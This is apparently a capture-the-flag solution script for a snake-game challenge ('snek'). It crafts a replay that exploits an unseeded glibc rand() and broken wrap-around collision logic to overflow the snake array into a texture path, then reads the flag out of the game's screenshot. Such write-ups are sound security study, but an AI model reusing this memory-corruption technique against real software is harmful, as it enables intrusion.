#!/usr/bin/env python3
#
# @mebeim - 2025-09-27
#

import sys
from os import getenv
from io import BytesIO
from pathlib import Path
from subprocess import check_call, DEVNULL
from tempfile import NamedTemporaryFile

from PIL import Image
from pwn import remote, ELF, args


HOST = getenv('HOST', 'localhost')
PORT = int(getenv('PORT', 1337))


# NOTE: Apple positions are 100% predictable given that GLIBC rand() does not
# get seeded at the start of the program. The following works as of Debian GLIBC
# 2.36. Although unlikely, future GLIBC versions may alter the RNG and break
# the few assumption about apple positions made here. In such case the replay
# script would need some changes.
def gen_replay() -> str:
	# Start by growing to a nice length. Go bottom right at (9, 9) and safely
	# sweep the screen 25 times. At the end of this we have length 100 and the
	# head is at (9, 9) going down.
	replay = '...S...'
	replay += 'A........W........DS.......DW.......DS.......DW.......DS.......DW.......DS.......DW.......DS........' * 24

	# At this point the snek completely fills the grid. However, the apple is
	# still present at its last position, which is (7, 6). We cannot keep
	# sweeping within the grid or we'll collide with our body and die. We can
	# however wrap around going down, offseting the head position VS the rest of
	# the snek segments, and then proceed sweeping. This exploits the broken
	# collision detection logic that does not account for wrap around. The apple
	# will also start moving again because enough snek segments will overlap
	# when apple_move() calculates their position using modulus.
	replay += '..........AW........AS........AW........AS........AW........AS........AW........AS........AW........'

	# Snek is now on the first column going up with length 105. Apple is at
	# (0, 0). Keep going up wrapping around until every snek segment has X = 0.
	replay += '.' * 106

	# The snek is now 106 segments long, with the last two segments overflowing
	# into the first texture path (texture_info[0].path[]), which should be
	# "textures/apple.bin". Head and tail are both at some (0, Y) position,
	# which is perfect. The coords are two shorts i.e. 2 bytes each. The X coord
	# of the last segment overwrites texture_info[0].path[4] with a NUL
	# terminator ('\0'): make this permanent by killing ourselves and resetting
	# back to initial length (3) and position.
	replay += 'DSA'

	# We respan and now need to become 105 segments long. Repeat initial sweep.
	replay += '...S...'
	replay += 'A........W........DS.......DW.......DS.......DW.......DS.......DW.......DS.......DW.......DS........' * 26
	replay += '..........AW........AS........AW........AS........AW........AS........AW........AS........AW........'

	# Snek is again on the first column going up with length 104. Apple is again
	# at (0, 0). LOL. Keep going 10 more cells to eat it.
	replay += '.' * 10

	# Snek is now 105 segments long, with head at (0, 0) going up. The last
	# segment overflows into the first texture path again. Write "flag" there by
	# moving it to (0x6c66, 0x6761) and dying. We just need to wrap around a
	# bunch of times going right and another bunch of times going down, avoiding
	# the apple, which is now at (9, 3).
	replay += 'D' + '.' * (0x6c66 - 1)
	replay += 'S' + '.' * (0x6761 - 1)
	replay += '.' * 101 + 'DWA'

	# We respawn and the game loads the falg as apple texture. We have it on
	# screen at (2, 6). No need to kee playing until game over, stop the replay
	# here. GG!
	return replay


def extract_flag_from_png(img_path_or_data: Path|str|bytes|bytearray) -> str|None:
	if isinstance(img_path_or_data, (Path, str)):
		img = Image.open(img_path_or_data)
	else:
		assert isinstance(img_path_or_data, (bytes, bytearray)), type(img_path_or_data)
		img = Image.open(BytesIO(img_path_or_data))

	px = img.getdata()
	raw_px = b''.join(bytearray(p) for p in px)

	# Flag should be plaintext and contiguous in the RGB pixel bytes, as long
	# as its length does not exceed 20 x 3 (texture width in bytes). If it does,
	# it will occupy multiple texture rows, thus it will be split into separate
	# pieces with gaps of 20 x 3 x 9 (grid width) bytes.
	start = raw_px.find(b'ptm{')
	end = raw_px.find(b'}', start)
	if start == -1 or end == -1:
		return None

	return raw_px[start:end + 1].decode()


def solve_local(exe_path: Path):
	replay = gen_replay()

	with NamedTemporaryFile('w', prefix='snek_game_replay_') as f:
		f.write(replay)
		f.flush()

		# We are redirecting output to /dev/null so we won't see any log.
		# Disable redirection if something is not working and debugging is
		# needed here.
		check_call(['./snek', '--fast-replay', f.name], stdout=DEVNULL,
			stderr=DEVNULL, cwd=exe_path.parent, env={'SDL_VIDEODRIVER': 'dummy'})

	return extract_flag_from_png('/tmp/snek.png')


def solve_remote():
	replay = gen_replay().encode()

	r = remote(HOST, PORT)
	r.sendlineafter(b'Replay size: ', str(len(replay)).encode())
	r.sendafter(b'Replay data: ', replay)
	r.sendlineafter(b'Download game over screenshot (y/n)? ', b'y')

	png = r.recvall(timeout=5)
	if len(png) < 100:
		# Cannot possibly be a valid PNG
		return None

	return extract_flag_from_png(png)


def main():
	if len(sys.argv) != 2:
		sys.exit(f'Usage: {sys.argv[0]} path/to/snek [REMOTE]')

	exe_path = Path(sys.argv[1])
	exe = ELF(exe_path, checksec=False)

	dist = exe.sym.texture_info - exe.sym.snek
	assert dist == 104 * 4, f'Unexpected data offsets ({dist}), exploit needs update!'

	# Of course pwntools gotta remove stuff from sys.argv... lol
	if args.REMOTE:
		flag = solve_remote()
	else:
		flag = solve_local(exe_path)

	if flag is None:
		sys.exit('Could not get flag!')

	print(flag)


if __name__ == '__main__':
	main()
